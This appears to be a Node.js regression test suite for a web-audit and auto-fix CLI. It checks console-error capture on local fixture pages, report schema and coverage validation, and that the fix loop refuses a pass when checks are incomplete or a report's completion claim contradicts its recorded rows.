#!/usr/bin/env node
// SUITE CONVENTION, learned the expensive way (web-uplift-17o): a test that needs a local
// server must drive the CLI IN-PROCESS via gather() - NOT by running the CLI as a child with
// an in-process server. spawnSync blocks the parent's event loop, so the in-process server
// never answers the child's browser (observed directly: zero server hits and a 30s timeout
// on a HEALTHY page, for trace and dom alike). Worse, that failure mode MIMICS a starvation
// defect: a healthy page simply times out, indistinguishable from the behaviour under test,
// so a harness built that way cannot observe the behaviour it exists to check. The --out
// argument-validation tests are the exception: they exit before any browser launches, so a
// child run with an in-process server is safe there.
import http from 'node:http';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readlinkSync, readFileSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, relative, resolve } from 'node:path';
import { spawn, spawnSync } from 'node:child_process';
import { fileURLToPath, pathToFileURL } from 'node:url';
import Ajv2020 from 'ajv/dist/2020.js';
import addFormats from 'ajv-formats';
import { assertPageDerivedFetchAllowed, gather, iconSatisfies, isFirstPartyHost, isThirdPartyCookie, readSourceTree, redactHeaderList, safeFetch, scanTextForSecrets, waitForInteractEvidence } from '../evidence/cli.mjs';
import { AGENTS, SKILL_REQUIRED_COMMANDS, headlessBashRules } from '../runner/agents.mjs';
import { launchChrome, resolveChromePath } from '../evidence/cdp.mjs';
import { snapshotTree, diffTrees, executableIntegrity, EXECUTABLE_HASH_ROOTS } from '../runner/write-scope.mjs';

const repoRoot = resolve(fileURLToPath(new URL('..', import.meta.url)));
const tmp = mkdtempSync(join(tmpdir(), 'web-uplift-regression-'));
const SKIP_DIRS = new Set(['.git', 'node_modules', 'reports', 'scratch']);

try {
  testSyntaxChecks();
  testPackageRootImportIsSideEffectFree();
  testChromeCandidateDiscovery();
  testIconSatisfiesMatrix();
  testFirstPartyHostMatrix();
  await testPageDerivedFetchGuard();
  await testSafeFetchRedirectAndSizeGuard();
  await testLaunchRetryAndDiagnostics();
  testSchemaValidation();
  testAtomicCoverageValidator();
  testGuidanceUsage();
  testGuidanceVersionPinnedInDocs();
  testHeadlessAllowlistIsScoped();
  testHeadlessAllowlistMatchesSkillContract();
  testSkillWriteContractGuard();
  testRedactHeaderList();
  testInstalledEvidenceCli();
  testInstalledTreeRelativeImportsResolve();
  testUpdateDryRunReadsInstallManifest();
  testCachedUpdateWarning();
  await testPreNavigationEmulation();
  await testAxePrimitiveBypassesStrictCsp();
  await testThrottlingConditions();
  await testLocaleTimezoneConditions();
  await testHarRedirects();
  await testCredentialRedactionHelpers();
  await testHarCredentialRedaction();
  await testCdpDeadline();
  testAwaitCensus();
  await testFetchDeadlineAndRawComparison();
  await testLaunchAttributionForHungPrimitive();
  await testOperatorLaunchAttribution();
  await testAgentChildEnvAllowlist();
  await testBatchIsolationGate();
  await testMcpSkillsServerStdio();
  await testSecretsScanHandlesQuotedScriptUrl();
  await testTrackersThirdPartySuffix();
  await testHarWaitsForPendingResponses();
  await testHarRedactsCredentialHeaders();
  await testAxeKeepsPagePolicyAndDisclosesInjectionBypass();
  await testHeadersPrimitiveFindsHeadersRegardlessOfNameCase();
  await testHarReadsRequestContentTypeAndRedirectLocationRegardlessOfCase();
  await testScorecardRejectsEscapingComparisonRunIds();
  await testScorecardReservesImageBoxes();
  await testReservedImageBoxInBrowser();
  await testLatestPointerCannotEscapeTheRunRoot();
  await testInstallSurfaceMatchesWhatInstallVendors();
  await testSecretsArtifactDoesNotPersistMatches();
  testSecretsScanDoesNotPersistMatchCharacters();
  testSourceTreeRedactsBeforeInlining();
  await testDomSourceArtifactIsRedacted();
  await testEvidenceTruncationReporting();
  await testConsoleEvidence();
  await testConsoleInteractDeadlineValidation();
  await testFeaturesPrimitive();
  testBatchDryRunUsesRetainedDirs();
  testBatchFlowDryRun();
  testFixSurvivesUnscoreableReports();
  testFixRefusesPassOnIncompleteCoverage();
  testFixRefusesContradictoryCoverageClaim();
  testFixRejectsMalformedReports();
  await testFixWriteScopeDiffing();
  testFixModeRefusesOutOfScopeWrites();
  testFixModeScopeEdgeCases();
  testFixIsolationAssertion();
  testFixIsolatedRunPublishes();
  testBatchWriteScope();
  testWriteScopeCoversExecutedTrees();
  testBatchIntegrityGateAbortsOnTamperedExecutedTree();
  await testCompareReportsUnconcludedChecks();
  await testScorecardScoringAndRender();
  await testScorecardArtifactContainment();
  await testCompareArtifactContainment();
  await testDiscoverabilityHelpers();
  await testDiscoverabilityH1InRaw();
  await testTargetsPrimitive();
  await testResiliencePrimitive();
  await testResilienceWaitsForLateServiceWorkerRegistration();
  await testA11yTreePrimitive();
  await testBaselineOracle();
  await testFlowNormalize();
  await testLaunchSessionLoop();
  await testNoOrphanBrowser();
  console.log('tests OK');
} finally {
  rmSync(tmp, { recursive: true, force: true });
}

// Modern Web Guidance is mandatory: a report with issue-findings must record the
// guides it consulted, and every issue-finding must cite a guidanceId drawn from
// that list. This is what stops the "audit judged from memory, never called MWG"
// failure users reported — a report that skipped guidance fails validation here.
function testAtomicCoverageValidator() {
  const validator = join(repoRoot, 'schema', 'validate-report.mjs');
  const catalog = join(repoRoot, 'knowledge', 'principles.json');
  const valid = run(process.execPath, [validator, catalog, join(repoRoot, 'examples', 'playground-report.json')]);
  assert(valid.status === 0, `atomic coverage: valid fixture failed:\n${valid.stderr}\n${valid.stdout}`);

  const incomplete = JSON.parse(readFileSync(join(repoRoot, 'examples', 'playground-report.json'), 'utf8'));
  incomplete.checkOutcomes = incomplete.checkOutcomes.slice(1);
  incomplete.status = 'partial';
  incomplete.coverage = { ...incomplete.coverage, recorded: incomplete.checkOutcomes.length, judged: incomplete.checkOutcomes.length, missing: 1, complete: false };
  delete incomplete.overallScore;
  const incompletePath = join(tmp, 'incomplete-report.json');
  writeFileSync(incompletePath, JSON.stringify(incomplete));
  const rejected = run(process.execPath, [validator, catalog, incompletePath]);
  assert(rejected.status !== 0, `atomic coverage: missing check was not rejected:\n${rejected.stderr}\n${rejected.stdout}`);
}

function testGuidanceUsage() {
  const report = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));
  const findings = report.findings || [];
  assert(findings.length > 0, 'guidance: fixture should have issue-findings to check');
  const consulted = report.guidanceConsulted || [];
  assert(Array.isArray(consulted) && consulted.length > 0,
    'guidance: a report with issue-findings must populate guidanceConsulted (MWG was not called)');
  const consultedSet = new Set(consulted);
  for (const f of findings) {
    assert(typeof f.guidanceId === 'string' && f.guidanceId.length > 0,
      `guidance: finding ${f.id} is missing a guidanceId (its fix is not backed by Modern Web Guidance)`);
    assert(consultedSet.has(f.guidanceId),
      `guidance: finding ${f.id} cites guidanceId "${f.guidanceId}" that is not in guidanceConsulted`);
  }
  // The clean/fixed report may have no findings, but if it lists guidance it must be an array.
  const fixed = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert(fixed.guidanceConsulted === undefined || Array.isArray(fixed.guidanceConsulted),
    'guidance: fixed report guidanceConsulted must be an array when present');
}

// follow-best-practices/no-console-errors needs first-party evidence: what the
// page logged DURING load is invisible to a post-load evaluate probe, so the
// console primitive collects Runtime + Log events from before the navigation.
// The counts are split by source so a failed subresource request is not
// confused with a page-authored console error (web-uplift-2dg).
async function testConsoleEvidence() {
  const noisy = [
    '<!doctype html><html><head><title>noisy</title><script>',
    "  console.warn('fixture warning');",
    "  console.error('fixture console error');",
    "  console.error('fixture console error');",
    "  setTimeout(function () { throw new Error('fixture uncaught exception'); }, 0);",
    "  fetch('/missing.json').catch(function () {});",
    '</script></head><body><p>Deterministic console story.</p></body></html>',
  ].join('\n');
  const clean = '<!doctype html><html><head><title>clean</title></head><body><p>Nothing is logged here.</p>' +
    '<button id="boom">boom</button>' +
    "<script>document.querySelector('#boom').addEventListener('click', function () { throw new Error('fixture interact exception'); });</script>" +
    '</body></html>';

  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/favicon.ico') {
      res.writeHead(204);
      res.end();
      return;
    }
    if (path === '/clean') {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(clean);
      return;
    }
    if (path === '/noisy') {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(noisy);
      return;
    }
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('not found');
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;

    const result = await gather('console', `${base}/noisy`, { quiet: true, wait: 500 });
    const block = result.console;
    assert(
      block.exceptionCount === 1 && block.entries.some((e) => e.kind === 'exception' && e.text.includes('fixture uncaught exception')),
      `console: the load-time exception was not captured: ${JSON.stringify(block)}`,
    );
    assert(
      block.consoleErrorCount === 1 && block.entries.some((e) => e.text.includes('fixture console error')),
      `console: the load-time console error was not captured: ${JSON.stringify(block)}`,
    );
    assert(
      block.warningCount === 1 && block.entries.some((e) => e.text.includes('fixture warning')),
      `console: the console warning was not captured: ${JSON.stringify(block)}`,
    );
    assert(
      block.networkErrorCount === 1 && block.entries.some((e) => e.source === 'network' && (e.url || '').endsWith('/missing.json')),
      `console: the failed subresource request was not captured separately: ${JSON.stringify(block)}`,
    );
    assert(block.hasErrors === true, `console: a page that threw should report errors: ${JSON.stringify(block)}`);
    const repeated = block.entries.find((e) => e.text.includes('fixture console error'));
    assert(repeated.repeat === 2, `console: identical messages should collapse into a repeat count: ${JSON.stringify(repeated)}`);
    const exception = block.entries.find((e) => e.kind === 'exception');
    assert(Array.isArray(exception.stack) && exception.stack.length > 0, `console: an exception should carry a stack frame: ${JSON.stringify(exception)}`);

    // Every primitive carries the block, and the artifact a primitive writes has
    // to agree with its stdout: that is what emit() is for.
    const out = join(tmp, 'console-dom-artifact.json');
    const cli = await runAsync(process.execPath, [
      'evidence/cli.mjs', 'dom', `${base}/noisy`, '--wait', '300', '--out', out, '--interact-deadline', '2000',
    ]);
    assert(cli.status === 0, `console: dom CLI failed:\n${cli.stderr}`);
    const artifact = JSON.parse(readFileSync(out, 'utf8'));
    const stdout = JSON.parse(cli.stdout);
    assert(
      artifact.console?.exceptionCount === 1 && stdout.console?.exceptionCount === 1,
      `console: the console block should ride along on other primitives, in the artifact and stdout:\n${JSON.stringify({ artifact: artifact.console, stdout: stdout.console })}`,
    );

    // A page that logs nothing reports zeroes: the empty block is the evidence
    // that the check can pass, not the absence of evidence.
    const cleanResult = await gather('console', `${base}/clean`, { quiet: true, wait: 400 });
    assert(
      cleanResult.console.entryCount === 0 && cleanResult.console.hasErrors === false && cleanResult.console.entries.length === 0,
      `console: a page that logs nothing must report zeroes: ${JSON.stringify(cleanResult.console)}`,
    );

    // Interaction errors count too: the same page throws only when its button is
    // clicked, which is exactly the error class a post-load probe cannot see.
    const interactResult = await gather('console', `${base}/clean`, {
      quiet: true,
      wait: 400,
      // An explicit deadline: under load the zero-delay click's exception can
      // cross the old fixed 250ms window, which was the 7kl flake.
      interactDeadlineMs: 2000,
      interact: "setTimeout(() => document.querySelector('#boom').click(), 0)",
    });
    assert(
      interactResult.console.exceptionCount === 1 &&
        interactResult.console.entries.some((e) => e.text.includes('fixture interact exception')),
      `console: an error raised by --interact was not captured: ${JSON.stringify(interactResult.console)}`,
    );
    assert(
      interactResult.interactObserved === true && interactResult.interactEvidencePending === false,
      `console: a captured interact must report observed evidence and no truncation: ${JSON.stringify({ observed: interactResult.interactObserved, pending: interactResult.interactEvidencePending, wait: interactResult.interactWaitMs })}`,
    );

    // AC1: a benign entry at +0ms must not mask a throw at +100ms. A poll that
    // returns on the FIRST new entry misses the exception; the trailing silence
    // window is what catches it.
    const mixedResult = await gather('console', `${base}/clean`, {
      quiet: true,
      wait: 400,
      interactDeadlineMs: 2000,
      interact:
        "setTimeout(() => console.warn('fixture benign entry'), 0);" +
        "setTimeout(() => document.querySelector('#boom').click(), 100)",
    });
    assert(
      mixedResult.console.warningCount === 1 &&
        mixedResult.console.entries.some((e) => e.text.includes('fixture benign entry')),
      `console: the benign interact entry was not captured: ${JSON.stringify(mixedResult.console)}`,
    );
    assert(
      mixedResult.console.exceptionCount === 1 &&
        mixedResult.console.entries.some((e) => e.text.includes('fixture interact exception')),
      `console: a throw after an earlier benign entry was missed (first-entry-only exit): ${JSON.stringify(mixedResult.console)}`,
    );

    // AC2: a quiet interaction costs the default settle, not the hard deadline,
    // and is not reported as a pending failure.
    const quietResult = await gather('console', `${base}/clean`, { quiet: true, wait: 400, interact: 'void 0' });
    assert(
      quietResult.interactObserved === false && quietResult.interactEvidencePending === false,
      `console: a quiet interact must not report observed or pending evidence: ${JSON.stringify({ observed: quietResult.interactObserved, pending: quietResult.interactEvidencePending })}`,
    );
    assert(
      quietResult.interactWaitMs >= 200 && quietResult.interactWaitMs < 1000,
      `console: a quiet interact must return on the default settle, not the hard deadline: ${quietResult.interactWaitMs}ms`,
    );

    // AC3: with an explicit longer deadline, an entry that only arrives at +700ms
    // is still captured, and the reported wait reflects it.
    const delayedResult = await gather('console', `${base}/clean`, {
      quiet: true,
      wait: 400,
      interactDeadlineMs: 2000,
      interact: "setTimeout(() => document.querySelector('#boom').click(), 700)",
    });
    assert(
      delayedResult.console.exceptionCount === 1 &&
        delayedResult.console.entries.some((e) => e.text.includes('fixture interact exception')),
      `console: an interact error raised after the old 250ms window was not captured: ${JSON.stringify(delayedResult.console)}`,
    );
    assert(
      delayedResult.interactEvidencePending === false,
      `console: the poll must report that evidence arrived rather than pending: ${JSON.stringify({ wait: delayedResult.interactWaitMs, pending: delayedResult.interactEvidencePending })}`,
    );
    assert(
      typeof delayedResult.interactWaitMs === 'number' && delayedResult.interactWaitMs >= 650,
      `console: the poll must wait for the delayed entry and report how long it waited: ${delayedResult.interactWaitMs}`,
    );

    // A typo'd --interact-deadline must fail fast at parse time rather than
    // becoming an unbounded wait (NaN / Infinity) or a vacuous one (<= 0). These
    // are parse errors, so no browser is launched (web-uplift-3t2 review).
    for (const bad of ['foo', '0', '-5', 'Infinity', 'NaN', '']) {
      const rejected = await runAsync(process.execPath, [
        'evidence/cli.mjs', 'console', `${base}/clean`, '--interact', 'void 0', '--interact-deadline', bad,
      ]);
      assert(
        rejected.status !== 0 && /--interact-deadline must be a positive number/.test(rejected.stderr),
        `console: --interact-deadline ${bad} must be rejected with a usage error, got status ${rejected.status}: ${rejected.stderr}`,
      );
    }
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// A report that cannot be SCORED is still a legitimate INPUT to the hill-climb.
// fix.mjs used to seed its history with an unguarded scoreOf(baseline), so
// scoreReport's (correct) refusal to score incomplete atomic coverage killed the
// whole fix run with an unhandled throw - including on every report written
// before the coverage contract existed, which has no `coverage` field at all.
// Those are exactly the reports most in need of fixing.
function testFixSurvivesUnscoreableReports() {
  const complete = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));

  // Two shapes that scoreReport refuses: a partial run, and a pre-contract run.
  const partial = structuredClone(complete);
  partial.coverage.complete = false;
  partial.status = 'partial';
  const legacy = structuredClone(complete);
  delete legacy.coverage;

  const fixtures = { partial, legacy };
  for (const [name, report] of Object.entries(fixtures)) {
    writeFileSync(join(tmp, `fix-${name}.json`), JSON.stringify(report));
  }

  // --max-iterations 0 drives the whole path (baseline -> snapshot -> compare ->
  // scorecard) without spawning an agent or a browser.
  const runFix = (findings, extra = []) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fix-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fix-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
    ...extra,
  ]);

  for (const name of Object.keys(fixtures)) {
    const result = runFix(join(tmp, `fix-${name}.json`));
    assert(!/Refusing to score[\s\S]*at scoreReport/.test(result.stderr),
      `fix: ${name} report crashed the hill-climb instead of degrading:\n${result.stderr}`);
    assert(result.stdout.includes('Score unavailable:'),
      `fix: ${name} report did not explain why the score is unavailable:\n${result.stdout}`);
    assert(result.stdout.includes('score N/A'),
      `fix: ${name} report should print score N/A in the climb summary:\n${result.stdout}`);
    assert(result.stdout.includes('outstanding issue-findings to climb down'),
      `fix: ${name} report should still climb on outstanding findings:\n${result.stdout}`);
  }

  // An unscoreable report must never MEET a score goal. evaluateGates treats a
  // null outcome as not-applicable and PASSES it, so an all-null summary from a
  // partial report would otherwise satisfy every --goal-min and stop the climb
  // on a target that was never measured.
  const goalRun = runFix(join(tmp, 'fix-partial.json'), ['--goal-overall', '1', '--goal-min', 'discoverable=1']);
  assert(!goalRun.stdout.includes('PASS: score goal met.'),
    `fix: an unscoreable report falsely met a score goal:\n${goalRun.stdout}`);
  assert(goalRun.stdout.includes('atomic coverage complete'),
    `fix: the goal failure should name incomplete coverage as the reason:\n${goalRun.stdout}`);

  // The guard must not cost a complete report its score.
  const completeRun = runFix(join(repoRoot, 'examples/playground-report.json'), ['--goal-overall', '1']);
  assert(completeRun.status === 0, `fix: a complete report with a met goal should exit 0:\n${completeRun.stdout}${completeRun.stderr}`);
  assert(completeRun.stdout.includes('PASS: score goal met.'),
    `fix: a complete report should still meet a met goal:\n${completeRun.stdout}`);
  assert(!completeRun.stdout.includes('Score unavailable:'),
    `fix: a complete report must still be scoreable:\n${completeRun.stdout}`);
}

// The atomic coverage contract: a run carrying blocked or not-run checks is
// PARTIAL, never completed. fix.mjs used to decide pass/fail from findings
// alone, so a report with zero findings and five checks that never concluded
// printed "PASS: no outstanding issues remain." and exited 0 - the exact
// absence-of-evidence failure the contract exists to prevent, reintroduced
// through the fix path after the scorecard had closed it.
function testFixRefusesPassOnIncompleteCoverage() {
  const clean = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert((clean.findings ?? []).length === 0, 'fix coverage: the fixed fixture should have no findings');

  // Zero findings, but five checks never concluded: three blocked, two not-run.
  const partial = structuredClone(clean);
  partial.status = 'partial';
  for (let i = 0; i < 3; i++) {
    partial.checkOutcomes[i].status = 'blocked';
    partial.checkOutcomes[i].reason = 'Auth wall blocked this path';
  }
  for (let i = 3; i < 5; i++) {
    partial.checkOutcomes[i].status = 'not-run';
    partial.checkOutcomes[i].reason = 'Never attempted';
  }
  partial.coverage = { ...partial.coverage, judged: 53, blocked: 3, notRun: 2, complete: false };
  delete partial.overallScore;
  writeFileSync(join(tmp, 'fix-zero-findings-partial.json'), JSON.stringify(partial));

  // The same rows, but the report DECLARES itself complete. The checkOutcomes
  // rows are the authority, not the self-declaration, so this must not pass
  // either. Without that rule a report could buy a pass by lying in one field.
  const lying = structuredClone(partial);
  lying.status = 'completed';
  lying.coverage.complete = true;
  writeFileSync(join(tmp, 'fix-lying-complete.json'), JSON.stringify(lying));

  const runFix = (findings, extra = []) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fixcov-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fixcov-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
    ...extra,
  ]);

  for (const name of ['fix-zero-findings-partial', 'fix-lying-complete']) {
    const result = runFix(join(tmp, `${name}.json`));
    assert(!/^PASS:/m.test(result.stdout),
      `fix coverage: ${name} claimed a pass with unconcluded checks:\n${result.stdout}`);
    assert(result.status === 1,
      `fix coverage: ${name} should exit non-zero, got ${result.status}:\n${result.stdout}`);
    assert(/INCOMPLETE coverage \(3 blocked, 2 not-run\)/.test(result.stdout),
      `fix coverage: ${name} should name the unconcluded checks:\n${result.stdout}`);
    assert(result.stdout.includes('5 unconcluded check(s)'),
      `fix coverage: ${name} should count unconcluded checks in the summary:\n${result.stdout}`);
  }

  // A partial run must not buy a pass through a score goal either.
  const goalRun = runFix(join(tmp, 'fix-lying-complete.json'), ['--goal-overall', '1']);
  assert(!goalRun.stdout.includes('PASS: score goal met.'),
    `fix coverage: a partial run met a score goal:\n${goalRun.stdout}`);
  assert(goalRun.stdout.includes('atomic coverage complete'),
    `fix coverage: the goal failure should name incomplete coverage:\n${goalRun.stdout}`);

  // A pre-contract report has no coverage accounting at all, so its completeness
  // is unverifiable rather than clean. Zero findings is not enough to pass: the
  // run proceeds (that is the acl fix) but cannot claim a completed audit.
  const legacy = structuredClone(clean);
  delete legacy.coverage;
  delete legacy.overallScore;
  writeFileSync(join(tmp, 'fix-legacy-clean.json'), JSON.stringify(legacy));
  const legacyRun = runFix(join(tmp, 'fix-legacy-clean.json'));
  assert(!/^PASS:/m.test(legacyRun.stdout),
    `fix coverage: a report with no coverage accounting claimed a pass:\n${legacyRun.stdout}`);
  assert(legacyRun.stdout.includes('no coverage accounting in the report'),
    `fix coverage: the legacy report should say its coverage is unverifiable:\n${legacyRun.stdout}`);

  // A genuinely clean run (no findings, every check concluded) still passes.
  const cleanRun = runFix(join(repoRoot, 'examples/playground-report-fixed.json'));
  assert(cleanRun.status === 0,
    `fix coverage: a clean complete report should exit 0:\n${cleanRun.stdout}${cleanRun.stderr}`);
  assert(cleanRun.stdout.includes('PASS: no outstanding issues remain and every check concluded.'),
    `fix coverage: a clean complete report should pass:\n${cleanRun.stdout}`);
  assert(cleanRun.stdout.includes('0 unconcluded check(s)'),
    `fix coverage: a clean report should report zero unconcluded checks:\n${cleanRun.stdout}`);
}

// A structurally malformed report is invalid INPUT, not a crash (web-uplift-rj2).
// countOutstanding runs before the score safety net, so a non-array
// principleOutcomes or findings used to die with "x.filter is not a function" and
// a raw stack, and a non-array checkOutcomes was silently ignored, which let a
// zero-findings report print PASS. The shape is now validated once, at read time,
// and reported by name.
// web-uplift-cpm: a report whose coverage CLAIMS complete while recording no
// checks used to pass fix mode - "every check concluded" with zero checks, the
// absence-of-evidence failure the atomic coverage contract exists to prevent.
// The publication validator refuses such a report; fix mode now refuses it too,
// by naming the contradiction instead of trusting one asserted field.
function testFixRefusesContradictoryCoverageClaim() {
  const clean = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert((clean.findings ?? []).length === 0, 'fix cpm: the fixed fixture should have no findings');
  const expected = Number(clean.coverage?.expected ?? 0);
  const rows = (clean.checkOutcomes ?? []).length;
  assert(expected > 0 && rows === expected, `fix cpm: the fixture should account for every check (rows ${rows}, expected ${expected})`);

  const runFix = (findings) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fixcpm-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fixcpm-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
  ]);

  // The bead's repro: zero rows, empty accounting, complete: true.
  const zeroRows = structuredClone(clean);
  zeroRows.checkOutcomes = [];
  zeroRows.coverage = { recorded: 0, judged: 0, missing: 0, complete: true };
  zeroRows.status = 'completed';
  writeFileSync(join(tmp, 'cpm-zero-rows.json'), JSON.stringify(zeroRows));

  // The subtler shape: rows exist, but the accounting claims complete while
  // recording only a fraction of the checks the report expects.
  const shortAccounting = structuredClone(clean);
  shortAccounting.checkOutcomes = shortAccounting.checkOutcomes.slice(0, 5);
  shortAccounting.coverage = { ...shortAccounting.coverage, recorded: 5, judged: 5, complete: true };
  writeFileSync(join(tmp, 'cpm-short-accounting.json'), JSON.stringify(shortAccounting));

  const zeroRun = runFix(join(tmp, 'cpm-zero-rows.json'));
  assert(!/^PASS:/m.test(zeroRun.stdout), `fix cpm: a report claiming complete coverage with zero checks must not pass:\n${zeroRun.stdout}`);
  assert(zeroRun.status === 1, `fix cpm: the zero-check claim should exit non-zero, got ${zeroRun.status}:\n${zeroRun.stdout}`);
  assert(
    /coverage\.complete is true but the report records no checks/.test(zeroRun.stdout),
    `fix cpm: the refusal should name the contradiction:\n${zeroRun.stdout}`,
  );

  const shortRun = runFix(join(tmp, 'cpm-short-accounting.json'));
  assert(!/^PASS:/m.test(shortRun.stdout), `fix cpm: 5 of ${expected} recorded must not pass:\n${shortRun.stdout}`);
  assert(shortRun.status === 1, `fix cpm: the short accounting should exit non-zero, got ${shortRun.status}:\n${shortRun.stdout}`);
  assert(
    new RegExp(`coverage\\.complete is true but only 5 of ${expected} checks are recorded`).test(shortRun.stdout),
    `fix cpm: the refusal should name the shortfall:\n${shortRun.stdout}`,
  );

  // The control: a genuinely complete, zero-finding report still passes.
  const cleanRun = runFix(join(repoRoot, 'examples/playground-report-fixed.json'));
  assert(
    cleanRun.status === 0 && /PASS: no outstanding issues remain and every check concluded\./.test(cleanRun.stdout),
    `fix cpm: a genuinely complete clean report must still pass:\n${cleanRun.stdout}${cleanRun.stderr}`,
  );
}

function testFixRejectsMalformedReports() {
  const complete = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));

  const runFix = (findings) => run(process.execPath, [
    'fixer/fix.mjs',
    '--findings', findings,
    '--target', join(tmp, 'fix-src'),
    '--audit-url', 'http://127.0.0.1:9/',
    '--out', join(tmp, `fixshape-out-${Math.random().toString(36).slice(2)}`),
    '--reports-root', join(tmp, `fixshape-reports-${Math.random().toString(36).slice(2)}`),
    '--max-iterations', '0',
  ]);

  // Present but not an array: a named error, exit 1, no raw TypeError, no PASS.
  const malformed = {
    'shape-principle-outcomes': { principleOutcomes: {} },
    'shape-findings': { findings: {} },
    'shape-findings-string': { findings: 'not an array' },
    'shape-check-outcomes': { checkOutcomes: {} },
    'shape-artifacts': { artifacts: {} },
  };
  for (const [name, patch] of Object.entries(malformed)) {
    const path = join(tmp, `${name}.json`);
    const field = Object.keys(patch)[0];
    writeFileSync(path, JSON.stringify({ ...complete, ...patch }));
    const result = runFix(path);
    assert(result.status === 1,
      `fix shape: ${name} should exit 1, got ${result.status}:\n${result.stdout}${result.stderr}`);
    assert(
      result.stderr.includes(`Invalid report at ${path}: "${field}" must be an array`),
      `fix shape: ${name} should fail with a named shape error:\n${result.stderr}`,
    );
    assert(!/is not a function|is not iterable|Cannot read propert/.test(result.stderr),
      `fix shape: ${name} leaked a raw TypeError:\n${result.stderr}`);
    assert(!/^PASS:/m.test(result.stdout),
      `fix shape: ${name} must not pass:\n${result.stdout}`);
  }

  // A whole file that is not an object at all is the same class of input error.
  for (const [name, body] of [['shape-root-string', '"just a string"'], ['shape-root-array', '[1,2,3]']]) {
    const path = join(tmp, `${name}.json`);
    writeFileSync(path, body);
    const result = runFix(path);
    assert(
      result.status === 1 && result.stderr.includes(`Invalid report at ${path}: expected a JSON object`),
      `fix shape: ${name} should fail with a named shape error:\n${result.stderr}`,
    );
  }

  // The guard must not reject legal reports: absent and null fields stay legal
  // (pre-contract reports have no coverage or checkOutcomes at all), and a clean
  // report still runs through to its pass.
  const nullish = { ...structuredClone(complete), principleOutcomes: null, findings: [] };
  const nullishPath = join(tmp, 'shape-nullish.json');
  writeFileSync(nullishPath, JSON.stringify(nullish));
  const nullishRun = runFix(nullishPath);
  assert(
    nullishRun.status === 0 && !/Invalid report at/.test(nullishRun.stderr),
    `fix shape: null/empty fields must stay legal:\n${nullishRun.stdout}${nullishRun.stderr}`,
  );

  const legacy = structuredClone(complete);
  delete legacy.coverage;
  delete legacy.checkOutcomes;
  const legacyPath = join(tmp, 'shape-legacy.json');
  writeFileSync(legacyPath, JSON.stringify(legacy));
  const legacyRun = runFix(legacyPath);
  assert(
    !/Invalid report at/.test(legacyRun.stderr) && legacyRun.stdout.includes('Baseline:'),
    `fix shape: a pre-contract report must stay legal input:\n${legacyRun.stdout}${legacyRun.stderr}`,
  );
}

// A compare between two PARTIAL runs used to print "Outstanding
// issue-findings: 0 -> 0" while checks never concluded in either run, which
// reads as "nothing left to do". compare.mjs had its own findings-only copy of
// countOutstanding (fix.mjs had already grown completionState); the shared
// runner/remaining-work.mjs module is now the single definition both callers
// use, and compare reports the unconcluded checks for BOTH sides with a delta.
async function testCompareReportsUnconcludedChecks() {
  const { compareReports, renderCompareMd } = await import('../aggregate/compare.mjs');
  const clean = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert((clean.findings ?? []).length === 0, 'compare: the fixed fixture should have no findings');

  const makePartial = (blocked, notRun) => {
    const r = structuredClone(clean);
    r.status = 'partial';
    const rows = r.checkOutcomes;
    for (let i = 0; i < blocked; i++) { rows[i].status = 'blocked'; rows[i].reason = 'Auth wall blocked this path'; }
    for (let i = blocked; i < blocked + notRun; i++) { rows[i].status = 'not-run'; rows[i].reason = 'Never attempted'; }
    r.coverage = { ...r.coverage, judged: rows.length - blocked - notRun, blocked, notRun, complete: false };
    delete r.overallScore;
    return r;
  };

  const before = makePartial(3, 2); // 5 unconcluded
  const after = makePartial(1, 0);  // 1 unconcluded: four concluded, no finding resolved
  const cmp = compareReports(before, after);
  assert(cmp.summary.unconcludedBefore === 5,
    `compare: unconcludedBefore should be 5, got ${cmp.summary.unconcludedBefore}`);
  assert(cmp.summary.unconcludedAfter === 1,
    `compare: unconcludedAfter should be 1, got ${cmp.summary.unconcludedAfter}`);
  assert(cmp.before.unconcluded === 5 && cmp.after.unconcluded === 1,
    'compare: before/after blocks should carry the unconcluded counts');

  const md = renderCompareMd(cmp, { hostName: 'example.test' });
  assert(md.includes('Outstanding issue-findings:** 0 -> 0'),
    `compare: findings line should still render:\n${md}`);
  assert(md.includes('Unconcluded checks (blocked/not-run):** 5 -> 1 (-4)'),
    `compare: the unconcluded line must state BOTH sides and the delta:\n${md}`);

  // Same module, same counts as the hill-climb gate: fix.mjs and compare.mjs
  // must never disagree about what remains.
